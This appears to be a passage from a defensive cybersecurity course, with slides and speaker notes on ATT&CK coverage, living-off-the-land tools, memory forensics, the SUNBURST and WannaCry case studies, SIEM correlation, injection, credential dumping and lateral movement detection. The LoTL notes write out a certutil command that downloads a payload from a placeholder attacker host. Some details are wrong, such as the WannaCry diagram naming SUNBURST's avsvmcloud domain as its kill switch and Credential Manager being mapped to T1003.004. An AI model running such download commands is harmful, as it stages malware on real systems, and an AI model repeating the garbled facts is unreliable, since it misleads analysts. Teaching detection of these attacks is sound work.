One of the most powerful uses of ATT&CK is the ATT&CK Navigator, a web-based tool that allows security teams to color-code their detection coverage across the entire matrix. Teams mark techniques in green where they have detection rules, yellow where they have partial coverage, and red where they have no visibility. This "heat map" view immediately identifies coverage gaps. For example, many organizations have excellent coverage of Execution-phase techniques (they monitor process creation) but poor coverage of Collection and Staging (T1074) because they do not monitor file system activity in user directories. The Navigator exercise is a recommended lab activity for this unit.

Layering several threat groups' technique profiles in the ATT&CK Navigator reveals which techniques are used by multiple actors; those shared techniques are the highest-priority detection targets.
:::

%%%
---
unit: Techniques
code: LTL
title: Living Off the Land (LoTL) Techniques
---
:::callout style=soft
**Living Off the Land (LoTL)** attacks use legitimate operating system tools and features to execute malicious actions, making them difficult to detect with signature-based methods because no custom malware is deployed.
:::

:::image src="images/19_living_off_land_techniques.png" alt="Diagram showing five native Windows tools, PowerShell, WMI, certutil, mshta, and regsvr32, with arrows indicating their abuse paths: PowerShell for command execution, WMI for persistence and lateral movement, certutil for payload download, mshta for script execution, and regsvr32 for DLL execution" caption="LoTL abuse map: native Windows administration tools re-purposed as attack tools by adversaries seeking to blend in with legitimate administrative traffic." width=full
:::

:::table
| Tool | Normal Use | Attacker Abuse | ATT&CK Technique |
|---|---|---|---|
| **PowerShell** | Automation and administration | Remote code execution, reconnaissance, credential theft | T1059.001 |
| **WMI** | System management queries | Persistent event subscriptions, lateral movement | T1047, T1546.003 |
| **certutil.exe** | Certificate management | Downloading payloads from the internet (`certutil -urlcache`) | T1105 |
| **mshta.exe** | Runs HTML Applications (.hta) | Executing malicious scripts hosted on attacker infrastructure | T1218.005 |
| **regsvr32.exe** | Registers COM DLLs | Loading remote malicious DLLs, bypassing AppLocker | T1218.010 |
| **rundll32.exe** | Runs DLL entry points | Executing malicious DLL payloads while appearing legitimate | T1218.011 |
:::

:::notes
Living Off the Land is one of the most significant trends in modern threat actor behavior. Rather than deploying custom malware that antivirus and EDR products may recognize, sophisticated attackers use tools that are already installed on every Windows system. Because these tools are signed by Microsoft and are used regularly by IT administrators, their presence alone does not indicate malicious activity.

PowerShell is the most widely abused LoTL tool. An attacker with code execution privileges can use PowerShell to download additional payloads, enumerate Active Directory, harvest credentials from memory using a port of Mimikatz, and establish encrypted C2 channels, all using built-in cmdlets. The defense against PowerShell abuse is not disabling PowerShell, which would break legitimate administration, but rather enabling comprehensive PowerShell logging: Script Block Logging (Event ID 4104), Module Logging, and PowerShell Transcription. Together these logs capture the complete text of every PowerShell command executed, making malicious use visible even when obfuscation techniques are employed. MITRE ATT&CK T1059.001 documents dozens of real-world PowerShell abuse procedures from groups including APT29, Lazarus Group, and FIN7.

WMI (Windows Management Instrumentation) provides an especially dangerous persistence mechanism through WMI event subscriptions (MITRE ATT&CK T1546.003). An attacker can create a WMI subscription that executes a payload whenever a specific system event occurs, such as when a user logs on, or every thirty minutes. These subscriptions persist across reboots and are stored in the WMI repository (C:\Windows\System32\wbem\Repository), not the registry, meaning standard registry persistence monitoring will miss them. Detection requires querying the WMI repository for __EventFilter, __EventConsumer, and __FilterToConsumerBinding objects and comparing them against a known baseline.

Certutil.exe abuse deserves particular attention in training environments. The command `certutil -urlcache -split -f http://attacker.com/payload.exe payload.exe` downloads an arbitrary file from the internet and saves it to disk, entirely using a signed Microsoft binary. This technique was used in multiple 2019-2020 campaigns by the Lazarus Group for payload staging. Detection requires monitoring certutil.exe process creation (Sysmon Event ID 1) and flagging any execution that includes URL parameters.

A living-off-the-land download abuses a built-in, signed Windows utility (for example certutil, whose legitimate purpose is certificate management) to fetch a payload. Antivirus does not flag it because the binary is trusted and signed; catching it requires behavioral analysis of the command-line arguments, not signature matching.
:::

%%%
---
unit: Forensics
code: MEM
title: Memory Forensics with the Volatility Framework
---
:::callout style=soft
The **Volatility Framework** is an open-source memory forensics platform that extracts running processes, network connections, injected code, and encryption keys from raw RAM images captured from live or compromised systems.
:::

:::image src="images/19_volatility_memory_forensics.png" alt="Workflow diagram showing three stages: a RAM image file on the left acquired via WinPMEM, Volatility Framework plugins in the center running pslist, netscan, and malfind commands, and extracted forensic artifacts on the right including process list, active connections, and injected code segments" caption="Volatility memory forensics workflow: plugins operate against a raw RAM image to extract artifacts that no longer exist on disk after system shutdown." width=full
:::

:::steps
1. **Acquire Memory Image:** Use WinPMEM or Magnet RAM Capture to create a bit-for-bit copy of physical RAM while the system is live.
2. **Identify Profile:** Run `volatility -f memory.raw imageinfo` to identify the operating system version and kernel build.
3. **List Processes:** Run `pslist` and `pstree` to enumerate running processes and identify orphaned or suspicious parent-child relationships.
4. **Scan Network Connections:** Run `netscan` to list active and recently closed TCP/UDP connections, including the owning process.
5. **Detect Injection:** Run `malfind` to identify memory regions with executable permissions that do not map to a file on disk, a primary indicator of process injection.
6. **Extract Artifacts:** Dump suspicious processes with `procdump` and pass hashes to VirusTotal or a local YARA scanner.
:::

:::notes
Memory forensics is the practice of analyzing the contents of a system's physical RAM to recover forensic evidence that would be lost if the system were powered off. It is an essential capability for investigating fileless malware, process injection, and active attacker sessions.

The Volatility Framework, created by Aaron Walters and released in 2007, has become the industry-standard open-source tool for memory analysis. It supports memory images from Windows, Linux, and macOS and provides over one hundred plugins covering every aspect of memory analysis. The framework operates on raw memory images acquired using tools like WinPMEM (open source, created by Michael Cohen) or commercial tools like Magnet RAM Capture and FTK Imager.

The most forensically valuable Volatility plugins for threat detection are pslist/pstree, netscan, and malfind. The pslist plugin extracts the list of running processes from the EPROCESS kernel data structure. When compared against psscan (which scans raw memory for EPROCESS structures regardless of the active process list), discrepancies indicate hidden processes, a technique called Direct Kernel Object Manipulation (DKOM), used by rootkits to conceal themselves. This maps to MITRE ATT&CK T1014 (Rootkit).

The netscan plugin is particularly powerful for active compromise scenarios. It recovers TCP and UDP connection structures from memory, including connections that were closed shortly before the memory capture. This allows investigators to identify C2 server IP addresses and ports even if the attacker's malware has already disconnected. The malfind plugin implements a detection heuristic: it identifies memory regions that have executable (PAGE_EXECUTE) or execute-write permissions, do not map to a file on disk, and contain sequences of bytes that resemble a PE header (MZ magic bytes). This is the primary detection for reflective DLL injection, the technique used by Metasploit Meterpreter and Cobalt Strike Beacon to inject payloads into memory without touching disk. CVE-2021-34527 (PrintNightmare) was frequently exploited with reflective injection payloads; malfind would have detected the injected DLL in spoolsv.exe memory.

Memory forensics takes time to learn but is often the only source of actionable evidence against sophisticated actors using fileless techniques, whose artifacts exist only in RAM. Practice resources such as the MemLabs challenge build the skill.
:::

%%%
---
unit: CaseStudy
code: CS1
title: Case Study, SolarWinds SUNBURST (2020)
---
:::callout style=soft
The **SolarWinds SUNBURST** supply chain compromise (December 2020) is the most significant cyber espionage operation ever publicly disclosed, affecting over eighteen thousand organizations including US federal agencies. It demonstrates the limits of perimeter-based detection.
:::

:::image src="images/19_solarwinds_sunburst_timeline.png" alt="Timeline diagram spanning October 2019 to December 2020 showing seven stages of the SUNBURST campaign: initial supply chain compromise, trojanized build process, software distribution to victims, fourteen-day dormancy, C2 establishment via HTTPS to avsvmcloud.com, lateral movement to email systems, and eventual discovery by FireEye" caption="SUNBURST campaign timeline: a supply chain insertion in October 2019 went undetected for fourteen months, demonstrating how behavioral dormancy defeats time-based detection heuristics." width=full
:::

:::steps
1. **Supply Chain Insertion (Oct 2019):** Attackers compromised SolarWinds' build environment and inserted malicious code into the Orion software build pipeline.
2. **Trojanized Update Distribution (Mar 2020):** The backdoored Orion update (version 2019.4 through 2020.2.1) was digitally signed and distributed to SolarWinds customers.
3. **Fourteen-Day Dormancy:** SUNBURST waited fourteen days before activating C2 communications, defeating behavioral tools that use short observation windows.
4. **Domain Generation & C2:** SUNBURST contacted `avsvmcloud[.]com` using subdomain-encoded victim identifiers, blending in with legitimate Orion network traffic.
5. **Lateral Movement:** On high-value targets, attackers deployed a second-stage implant (TEARDROP/Raindrop) and moved laterally to Microsoft 365 cloud environments.
6. **Discovery (Dec 2020):** FireEye discovered the compromise while investigating an anomalous MFA device registration on a privileged account, a host-based IOC, not a network IOC.
:::

:::notes
The SolarWinds SUNBURST campaign is studied in every advanced security curriculum because it challenged assumptions about supply chain trust, detection capabilities, and organizational resilience simultaneously. Understanding this case in detail is essential for any security professional.

The initial compromise involved the insertion of malicious code into SolarWinds' build system, likely through a compromised developer credential or a build server vulnerability. The attackers modified the Orion software source to include the SUNBURST backdoor, which was then compiled, digitally signed with SolarWinds' legitimate code signing certificate, and distributed as a legitimate software update. This technique, MITRE ATT&CK T1195.002 (Compromise Software Supply Chain), bypassed every endpoint protection product that trusted Microsoft Authenticode signatures as a validation mechanism.

The fourteen-day dormancy period was a deliberate countermeasure against behavioral detection tools. Many EDR and sandbox products analyze suspicious binaries for fourteen days of behavior. By waiting exactly this period before activating, the attackers ensured that automated behavioral analysis would conclude the software was benign before C2 activity began. The C2 channel used DNS subdomain encoding, victim identifiers encoded as subdomains of avsvmcloud.com, making the traffic appear as normal DNS resolution rather than C2 communication. The GUID-based subdomain encoding was designed to avoid pattern matching on C2 domains.

The critical lesson from SUNBURST is how it was actually discovered. FireEye was investigating an anomalous second-factor authentication device registration on a privileged employee account, a host-based indicator (Security Event ID 4720 equivalent for Azure AD), when they uncovered the broader campaign. This was not a network detection or a signature match. It was a human analyst noticing an anomalous action in identity logs. The Pyramid of Pain explains this: SUNBURST evaded hash-based detection (new signatures), IP and domain blocking (generated unique subdomains), and tool detection (used legitimate binaries). The only detection path was TTP-level, identifying the behavioral anomaly of privileged account manipulation.

NIST IR 8276 (Key Practices in Cyber Supply Chain Risk Management) was updated following this incident to recommend software bill of materials (SBOM) requirements and build environment integrity verification. CVE-2020-10148 (SolarWinds Orion Authentication Bypass) was separately discovered and also requires patching in affected environments.

FireEye's disclosure "Highly Evasive Attacker Leverages SolarWinds Supply Chain to Compromise Multiple Global Victims With SUNBURST Backdoor" is an exceptionally detailed technical account suited to close study.
:::

%%%
---
unit: CaseStudy
code: CS2
title: Case Study, WannaCry Ransomware (2017)
---
:::callout style=soft
**WannaCry** (May 2017) was a self-propagating ransomware worm that exploited the NSA-developed **EternalBlue** (CVE-2017-0144) SMBv1 vulnerability to infect over 230,000 systems in 150 countries within 72 hours.
:::

:::image src="images/19_wannacry_propagation.png" alt="Network diagram showing WannaCry's two-phase propagation model: initial infection vector via phishing or exposed SMB, then autonomous lateral scanning on TCP port 445 across both the local subnet and random external IP ranges, with a kill-switch domain check to avsvmcloud and ransom note deployment on each infected host" caption="WannaCry propagation model: EternalBlue exploitation plus DoublePulsar backdoor installation created autonomous self-replication requiring no human interaction after initial infection." width=full
:::

::::columns ratio=1:1
::col::
::::card heading="Attack Chain"
:::list style=plain
- **Exploit:** EternalBlue (CVE-2017-0144) exploits an SMBv1 buffer overflow to gain SYSTEM-level remote code execution.
- **Backdoor Install:** DoublePulsar kernel-mode backdoor implanted via SMB.
- **Propagation:** WannaCry scans for other SMBv1 hosts on TCP 445 and self-replicates.
- **Payload:** AES-encrypted file extension change (.WNCRY) and ransom note delivery.
:::
::::
::col::
::::card heading="Detection Opportunities"
:::list style=plain
- **Network:** Mass outbound SMB connections from a single host (lateral movement indicator).
- **Host:** Sysmon Event ID 3 (network connection) to TCP 445 from a non-admin process.
- **Host:** Rapid file creation events for .WNCRY files (Sysmon Event ID 11).
- **Patch:** MS17-010 (released March 2017) patches EternalBlue, unpatched systems two months later were fully exposed.
:::
::::
::::

:::notes
The WannaCry outbreak of May 12, 2017 remains the most financially damaging ransomware event in recorded history, causing estimated losses of four to eight billion US dollars. Understanding its technical mechanism provides a concrete worked example of how multiple detection controls could have, and in some cases did, prevent infection.

The vulnerability at the heart of WannaCry is CVE-2017-0144, a heap buffer overflow in the Windows Server Message Block version 1 (SMBv1) protocol implementation. The exploit was developed by the NSA's Equation Group and leaked by the Shadow Brokers hacking group in April 2017. Microsoft had released a patch, MS17-010, in March 2017, five weeks before the WannaCry outbreak. Organizations that applied this patch were immune. The NHS (UK National Health Service) suffered catastrophic impact precisely because thousands of its systems were running unpatched Windows XP, an operating system whose mainstream support ended in 2014.

WannaCry's self-propagation mechanism produced highly detectable network artifacts. After infecting a host, the malware spawned threads that scanned random external IP ranges and the local subnet on TCP port 445, attempting the EternalBlue exploit against every reachable host. A single infected workstation would generate thousands of outbound connection attempts per minute. In terms of the network IOCs discussed earlier in this class, this is an extreme version of the lateral movement SMB scanning pattern. Network monitoring tools analyzing NetFlow data would detect the connection volume anomaly within seconds.

On the host, WannaCry produced two Sysmon detection opportunities. Sysmon Event ID 3 (Network Connect) would log the mass outbound SMB connections from a non-administrative process. Sysmon Event ID 11 (File Created) would generate thousands of events as the malware renamed encrypted files with the .WNCRY extension. The combination of mass network connections and mass file creation events simultaneously is a highly specific detection signature for ransomware worm behavior.

The accidental "kill switch" discovery by Marcus Hutchins (@MalwareTech) illustrates an unexpected defensive mechanism: WannaCry checked whether a specific long, nonsensical domain name was registered, and if it was, the malware exited. Hutchins registered the domain for ten dollars and stopped the spread. This behavior was a sandbox detection mechanism, malware authors sometimes check for internet connectivity as a sign that the sample is running in an automated analysis environment. Registering the domain converted this anti-sandbox check into a global kill switch.

The WannaCry kill switch was found by Marcus Hutchins while reverse-engineering the malware binary, the same skill malware authors use. The case raised lasting policy questions about vulnerability disclosure, the leakage of offensive cyber capabilities, and the ethics of security research.
:::

%%%
---
unit: Framework
code: TI
title: Threat Intelligence, STIX, TAXII & Threat Feeds
---
:::callout style=soft
**Structured Threat Information eXpression (STIX)** and **Trusted Automated eXchange of Intelligence Information (TAXII)** are OASIS standards for representing and distributing threat intelligence, enabling automated IOC ingestion into security platforms.
:::

:::image src="images/19_stix_taxii_architecture.png" alt="Architecture diagram showing the STIX/TAXII ecosystem: threat intelligence producers on the left generating STIX bundles containing Indicator and TTP objects, a central TAXII server acting as the distribution hub, and consumer SIEM and EDR platforms on the right automatically ingesting indicators for detection rule creation" caption="STIX/TAXII intelligence sharing architecture: structured threat data flows from producers through a TAXII server into consumer security platforms for automated detection." width=full
:::

::::columns ratio=1:1
::col::
::::card heading="STIX 2.1 Object Types"
:::list style=plain
- **Indicator:** Pattern matching rule (e.g., file hash or IP address with context).
- **Malware:** Description of a malware family and its capabilities.
- **Attack Pattern:** ATT&CK technique reference with procedural details.
- **Threat Actor:** Attribution data linking indicators to known groups.
- **Relationship:** Links between STIX objects (e.g., "Threat Actor uses Malware").
:::
::::
::col::
::::card heading="Common Threat Feed Sources"
:::list style=plain
- **CISA AIS:** Automated Indicator Sharing, free US government threat feed.
- **MISP:** Malware Information Sharing Platform, open-source, community-driven.
- **VirusTotal Enterprise:** Commercial hash and domain reputation service.
- **AlienVault OTX:** Open Threat Exchange, community-contributed indicators.
- **ISACs:** Industry-specific sharing groups (FS-ISAC, H-ISAC, E-ISAC).
:::
::::
::::

:::notes
Threat intelligence sharing addresses a fundamental asymmetry in cybersecurity: attackers share tools, techniques, and target lists across criminal forums, while defenders historically operated in organizational silos. STIX and TAXII were developed by MITRE and standardized through the OASIS standards body to enable systematic, machine-readable sharing of threat intelligence between organizations.

STIX version 2.1 defines a JSON-based data model for representing threat intelligence as discrete "objects." The key object types for detection are Indicators and Attack Patterns. A STIX Indicator object contains a pattern written in STIX Pattern Language, for example, `[file:hashes.'SHA-256' = 'abc123...']`, along with metadata about when the indicator was valid, confidence level, and the threat context that generated it. An Attack Pattern object references a specific MITRE ATT&CK technique, allowing threat intelligence producers to describe adversary behavior at the TTP level rather than just providing hash lists.

TAXII defines the HTTP-based API through which STIX content is distributed. A TAXII server hosts one or more "collections", groupings of STIX objects that clients can query and subscribe to. Modern SIEMs, including Splunk, Microsoft Sentinel, and IBM QRadar, include native TAXII client capabilities that automatically poll configured feeds and translate STIX Indicator objects into detection rules.

The practical limitation of external threat feeds is that hash-based indicators have short shelf lives, as discussed in the Pyramid of Pain, attackers trivially change file hashes. Organizations should treat hash feeds as useful but low-durability inputs and invest primarily in TTP-level detection rules derived from the Attack Pattern objects in intelligence feeds. The CISA Automated Indicator Sharing (AIS) program, established under the Cybersecurity Information Sharing Act of 2015, provides free STIX/TAXII feeds to US organizations and is particularly valuable for critical infrastructure sectors. Industry-specific Information Sharing and Analysis Centers (ISACs) provide sector-tailored intelligence, the Financial Services ISAC (FS-ISAC) is particularly mature, having shared intelligence across member banks since 1999.

High-quality government threat feeds, such as CISA's Automated Indicator Sharing over TAXII, are available at no cost. The quality of analysis matters more than the raw quantity of indicators.
:::

%%%
---
unit: Architecture
code: SIEM
title: SIEM Architecture & Correlation Rules
---
:::callout style=soft
A **Security Information and Event Management (SIEM)** system centralizes log collection from across the enterprise, enriches events with contextual data, and applies correlation rules to identify patterns that indicate active attacks.
:::

:::image src="images/19_siem_architecture.png" alt="SIEM architecture diagram with four layers: log source collection on the left (endpoints, firewalls, identity providers), log normalization and enrichment in the center-left, correlation rule engine in the center-right producing alerts, and SOC analyst dashboard on the right showing alert triage queue" caption="SIEM architecture: raw logs from disparate sources are normalized, enriched with threat intelligence context, and correlated against detection rules to produce actionable security alerts." width=full
:::

:::steps
1. **Collection:** Agents and syslog forwarders send raw events from endpoints, firewalls, Active Directory, and cloud services to the SIEM ingestion layer.
2. **Parsing & Normalization:** The SIEM parses vendor-specific log formats into a common schema (e.g., the Elastic Common Schema or the OCSF standard).
3. **Enrichment:** Events are enriched with geolocation, asset inventory data, and threat intelligence feed lookups to add context.
4. **Correlation:** Detection rules match patterns across multiple events, for example, a failed logon (4625) followed by a successful logon (4624) from the same source IP within sixty seconds, flagging a brute-force success.
5. **Alerting:** Correlated matches generate SIEM alerts with severity scores, forwarded to the SOC analyst triage queue.
6. **Investigation:** Analysts use the SIEM's search interface to pivot from the alert into the raw event timeline to validate and scope the incident.
:::

:::notes
A SIEM is the operational hub of a security operations center. Without a SIEM, the log sources discussed throughout this class, Windows Event Logs, Sysmon, firewall logs, Active Directory, exist as isolated data islands that cannot be correlated. The SIEM's primary value is correlation: detecting patterns that span multiple systems and multiple time periods.

The most powerful SIEM correlation rules are multi-event, multi-source rules. A single failed logon is noise. Five hundred failed logons from the same external IP address against multiple accounts within thirty seconds is a brute-force attack. A successful logon (Event ID 4624) immediately following that brute-force pattern from the same source IP is confirmation that the brute force succeeded, requiring immediate analyst response. No single log source captures this complete picture; only SIEM correlation can surface it.

Modern SIEMs include two major commercial platforms: Microsoft Sentinel (cloud-native, Azure-integrated) and Splunk Enterprise Security (on-premises or cloud). Both support the MITRE ATT&CK framework natively, Sentinel's Fusion detection engine automatically maps alerts to ATT&CK techniques, and Splunk's ES includes ATT&CK correlation rules in its content packages. The open-source alternative is the ELK Stack (Elasticsearch, Logstash, Kibana) with the Elastic SIEM add-on, which provides a fully functional detection platform at no license cost.

SIEM effectiveness is critically dependent on tuning. Out-of-the-box detection rules generate enormous volumes of false positives in most environments, a phenomenon called "alert fatigue" that directly contributed to the missed alerts in the 2013 Target breach. Effective SIEM tuning requires building organization-specific baselines: what processes normally run on workstations, which accounts normally authenticate at which hours, and which external IP ranges represent normal business traffic. Deviations from these baselines should trigger alerts; normal activity should be suppressed. NIST SP 800-92 section 4.4 provides guidance on log retention, storage sizing, and performance planning for centralized log management systems.

A SIEM with a high false-positive rate destroys analyst trust: an analyst facing ninety-five percent false positives begins dismissing alerts reflexively, the "cry wolf" effect. This human factor is as important as the technical implementation and is often overlooked in SIEM deployments.
:::

%%%
---
unit: Techniques
code: INJ
title: Process Injection Techniques
---
:::callout style=soft
**Process injection** (MITRE ATT&CK T1055) allows attackers to execute malicious code within the address space of a legitimate process, evading detection by hiding behind the trusted process's reputation and privileges.
:::

:::image src="images/19_process_injection_techniques.png" alt="Four-panel technical diagram illustrating the four most common process injection techniques: Classic DLL Injection showing WriteProcessMemory and CreateRemoteThread API calls, Reflective DLL Injection showing self-loading from memory, Process Hollowing showing legitimate process creation followed by image replacement, and APC Queue Injection showing asynchronous procedure call insertion into a thread's queue" caption="Process injection taxonomy: four distinct techniques for executing attacker code inside a legitimate process, each with different API call signatures and detection approaches." width=full
:::

:::table
| Technique | Mechanism | Detection Indicator | ATT&CK Sub-Technique |
|---|---|---|---|
| **DLL Injection** | WriteProcessMemory + CreateRemoteThread | Sysmon ID 8 (CreateRemoteThread); unsigned DLL loaded by process | T1055.001 |
| **Reflective DLL Injection** | Self-loading DLL resolves own imports | malfind: MZ header in non-mapped memory region | T1055.001 |
| **Process Hollowing** | Legitimate process created suspended; image replaced | Sysmon ID 1: process path does not match image hash | T1055.012 |
| **APC Queue Injection** | Malicious code queued as Asynchronous Procedure Call | NtQueueApcThread system call; thread in alertable state | T1055.004 |
| **Thread Hijacking** | Existing thread's context redirected to attacker code | GetThreadContext / SetThreadContext API sequence | T1055.003 |
:::

:::notes
Process injection is one of the most important adversary techniques to understand from a detection perspective because it is used at multiple stages of an attack: for privilege escalation, defense evasion, and credential access. Understanding the mechanisms helps analysts know where to look for detection artifacts.

Classic DLL injection is the foundational technique. An attacker gains a handle to a target process, allocates memory within that process using VirtualAllocEx, writes the path of a malicious DLL into that memory using WriteProcessMemory, then creates a remote thread using CreateRemoteThread that calls LoadLibrary with the malicious DLL path. The DLL loads into the target process and executes its DllMain entry point. The detection artifact for this technique is Sysmon Event ID 8 (CreateRemoteThread) from an unexpected source process. Legitimate use of CreateRemoteThread is rare, debuggers and some anti-cheat systems use it, but these are well-known exceptions that can be excluded from detection rules.

Reflective DLL injection, developed by Stephen Fewer in 2008 and now the primary technique used by Metasploit Meterpreter and Cobalt Strike Beacon, improves on classic injection by loading a DLL from memory rather than disk. The DLL contains its own custom loader that resolves Windows API imports and relocates the image without requiring LoadLibrary. This leaves no trace on disk, the malicious DLL never touches the file system. Detection requires memory analysis: Volatility's malfind plugin identifies memory regions with executable permissions that contain MZ (PE) headers but are not mapped to a file on disk.

Process hollowing (also called RunPE or process replacement) creates a legitimate process in a suspended state, for example, svchost.exe or notepad.exe, then unmaps its image from memory using NtUnmapViewOfSection and maps a malicious image in its place. The process is then resumed, executing the attacker's code under the identity and icon of a legitimate Windows process. Detection opportunities include: the spawning process creating a child in SUSPEND mode (unusual parent-child relationship), and image load events where the file hash does not match the executable on disk.

Credential-dumping tools target lsass.exe (MITRE ATT&CK T1003.001) because that process holds the Windows credential cache in memory, including NTLM hashes and Kerberos ticket material; reading lsass memory yields those credentials directly. This is what Mimikatz does, and it is why EDR products specifically protect lsass process memory from external access.
:::

%%%
---
unit: Techniques
code: CRED
title: Credential Dumping Detection
---
:::callout style=soft
**Credential dumping** (MITRE ATT&CK T1003) extracts authentication credentials from operating system memory, files, or the Active Directory database. Detecting these attempts is critical because stolen credentials enable lateral movement throughout the environment.
:::

:::image src="images/19_credential_dumping_detection.png" alt="Detection map diagram showing five credential dumping techniques on the left, LSASS memory access, NTDS.dit extraction, SAM hive copying, DCSync replication, and credential manager access, each connected by arrows to their corresponding detection indicators on the right: Sysmon events, Event IDs, and API call signatures" caption="Credential dumping detection map: five techniques used to steal Windows credentials, each with specific forensic artifacts detectable through host telemetry." width=full
:::

:::table
| Technique | What It Targets | Detection Artifact | ATT&CK ID |
|---|---|---|---|
| **LSASS Memory Access** | Kerberos tickets, NTLM hashes in lsass.exe | Sysmon ID 10: process opened lsass.exe with PROCESS_VM_READ | T1003.001 |
| **SAM Database Copy** | Local account hashes in HKLM\SAM | System Event 7045 + reg save HKLM\SAM command line | T1003.002 |
| **NTDS.dit Extraction** | All domain account hashes | ntdsutil.exe execution (Sysmon ID 1); Volume Shadow Copy creation | T1003.003 |
| **DCSync Attack** | Mimikatz replication of domain controller | Security Event 4662: DS-Replication-Get-Changes-All from non-DC | T1003.006 |
| **Credential Manager** | Saved browser and application passwords | vaultcmd.exe execution; dpapi decryption calls | T1003.004 |
:::

:::notes
Credential theft is the force multiplier of an attack. An attacker who successfully dumps credentials from one compromised system gains the ability to authenticate to every other system that accepts those credentials, without needing to exploit any additional vulnerabilities. This is why the Lateral Movement phase of ATT&CK follows so closely after the Credential Access phase.

LSASS memory access is the most operationally important technique to detect. The Windows Local Security Authority Subsystem Service (lsass.exe) is responsible for enforcing security policy and storing authentication credentials in memory for single sign-on. Mimikatz's sekurlsa::logonpasswords module opens a handle to lsass.exe with PROCESS_VM_READ access and reads credential structures directly from memory. Sysmon Event ID 10 (Process Access) captures this handle open, recording the source process, target process (lsass.exe), and the requested access rights. A detection rule that fires on any process, other than known-good security tools, requesting VM_READ access to lsass.exe is a high-fidelity indicator of credential dumping. Windows Credential Guard, introduced in Windows 10 and Server 2016, defends against this by moving the credential cache into a virtualization-based security (VBS) isolated environment that lsass.exe itself cannot directly access.

DCSync is a particularly sophisticated credential dumping technique that does not require any local code execution on the domain controller. Instead, the attacker's tool (Mimikatz lsadump::dcsync) uses legitimate Active Directory replication APIs to request password hashes from the domain controller, impersonating another domain controller requesting synchronization. From the domain controller's perspective, this looks like a normal replication request, unless the requesting account is not actually a domain controller. Security Event ID 4662, logged on the domain controller when a DS-Replication-Get-Changes-All replication operation is performed, is the primary detection for DCSync. A SIEM rule that fires on this event from any account that is not listed as a domain controller computer account provides high-precision detection.

The NTDS.dit file is the Active Directory database that contains password hashes for all domain accounts. It is locked by the domain controller OS during normal operation, but attackers can extract it using Volume Shadow Copy service commands or the ntdsutil.exe utility, both of which are legitimate administrative tools (LoTL again). Monitoring ntdsutil.exe execution (Sysmon Event ID 1) and any Volume Shadow Copy creation (System Event 7036) on domain controllers is an effective detection control.

A credential-dumping attack against lsass is operationally simple, yet it leaves a clear artifact: Sysmon Event ID 10 records the cross-process access to lsass memory. The contrast between how easy the attack is and how visible it is in the log is the core detection lesson.
:::

%%%
---
unit: Techniques
code: LAT
title: Lateral Movement Detection
---
:::callout style=soft
**Lateral movement** (MITRE ATT&CK TA0008) describes an attacker's techniques for progressively moving through a network after initial access, expanding access by compromising additional hosts using stolen credentials and exploiting trust relationships.
:::

:::image src="images/19_lateral_movement_detection.png" alt="Network diagram showing an attacker's lateral movement path from an initial compromised workstation through three hops to a domain controller, with detection checkpoints labeled at each hop: Sysmon network events at the source, authentication logs at intermediate systems, and pass-the-hash indicators at the domain controller" caption="Lateral movement detection opportunities: each hop in an attacker's network traversal generates authentication and network artifacts that can be correlated across SIEM data sources." width=full
:::

:::table
| Technique | Protocol/Tool | Key Detection Event | ATT&CK ID |
|---|---|---|---|
| **Pass-the-Hash** | NTLM authentication with hash | Event 4624 Logon Type 3 with NtLmSsp | T1550.002 |
| **Pass-the-Ticket** | Kerberos with forged ticket | Event 4768/4769 with unusual service | T1550.003 |
| **Remote Desktop** | RDP (TCP 3389) | Event 4624 Logon Type 10; Sysmon network ID 3 | T1021.001 |
| **SMB Admin Shares** | `\\host\ADMIN$` or `C$` | Event 5140 (network share access) | T1021.002 |
| **WMI Remote Execution** | WMI over DCOM (port 135) | Event 4688 / Sysmon ID 1 on remote host | T1021.006 |
| **PsExec** | Named pipe `PSEXESVC` | System Event 7045: new service PSEXESVC | T1569.002 |
:::

:::notes
Lateral movement is where many attacks transition from limited impact to enterprise-wide compromise. An attacker who controls a single workstation can cause relatively contained damage. An attacker who has moved laterally to a domain controller can modify Group Policy, create new administrative accounts, and potentially control every device in the Active Directory forest.

Pass-the-Hash (PtH) is the most common lateral movement technique observed in enterprise compromises. An attacker who has dumped NTLM hashes from a compromised host can authenticate to other Windows systems that accept NTLM without knowing the plaintext password. The hash itself serves as the authentication credential. Detection relies on identifying NTLM authentication events (Event ID 4624 with the authentication package showing NtLmSsp) originating from workstation accounts rather than service accounts or administrators, particularly during off-hours when legitimate administrators are not working.

PsExec deserves particular attention because it is widely used by both legitimate administrators and attackers. Microsoft Sysinternals PsExec operates by copying a service binary (PSEXESVC.exe) to the target system's ADMIN$ share and creating a service to execute it. This process generates three distinct detectable events: a network share access event (5140), a service installation event (7045 with service name PSEXESVC), and a process creation event on the remote system. The combination of these three events from a non-administrative source workstation is a reliable indicator. Notably, several variants of PsExec exist that use different service names (METERPRETER, etc.), SIEM rules should monitor for any service installation from a remote source followed by immediate execution, not just PSEXESVC specifically.

Detecting Pass-the-Ticket attacks requires monitoring for Kerberos authentication anomalies. A Golden Ticket attack (MITRE ATT&CK T1558.001) involves forging a Kerberos Ticket Granting Ticket (TGT) using the KRBTGT account hash, obtainable from a domain controller. Golden Tickets can be created with arbitrary expiration times (attackers set them to ten years) and arbitrary group memberships, allowing complete unrestricted access to any Kerberos resource. Detection requires monitoring for TGTs with unusual lifetimes (Event ID 4769) and domain controller Event ID 4672 (Special Logon) on accounts that should not have administrative access.

A legitimate administrative RDP session and attacker RDP lateral movement produce identical events; the difference is contextual, which account, from which source workstation, at what time, to which destination. Distinguishing them is where SIEM enrichment with asset inventory and user-behavior baselines becomes essential.
:::

%%%
---
unit: Architecture
code: EDR
title: Tool Spotlight, Endpoint Detection & Response (EDR)
---
:::callout style=soft
**Endpoint Detection and Response (EDR)** platforms combine continuous endpoint telemetry collection, behavioral analysis, threat intelligence correlation, and automated response capabilities into a single agent-based solution.
:::

:::image src="images/19_edr_capabilities_comparison.png" alt="Feature comparison matrix showing four EDR platforms, Microsoft Defender for Endpoint, CrowdStrike Falcon, SentinelOne, and Carbon Black, across eight capability dimensions including telemetry depth, MITRE ATT&CK coverage, response actions, threat hunting, and deployment model, rendered as a heat-map grid" caption="EDR capability comparison: all four platforms provide behavioral detection and response automation, differing primarily in deployment model, AI/ML maturity, and integration ecosystem." width=full
:::

::::columns ratio=1:1
::col::
::::card heading="Core EDR Capabilities"
:::list style=plain
- **Continuous Recording:** Full endpoint telemetry stored for historical forensic query (typically 7-30 days).
- **Behavioral Detection:** ML models identify anomalous process and network behavior without signatures.
- **ATT&CK Mapping:** Alerts automatically tagged with MITRE technique IDs for analyst context.
- **Threat Hunting:** Query interface for proactive investigation across all endpoints simultaneously.
:::
::::
::col::
::::card heading="Response Actions"
:::list style=plain
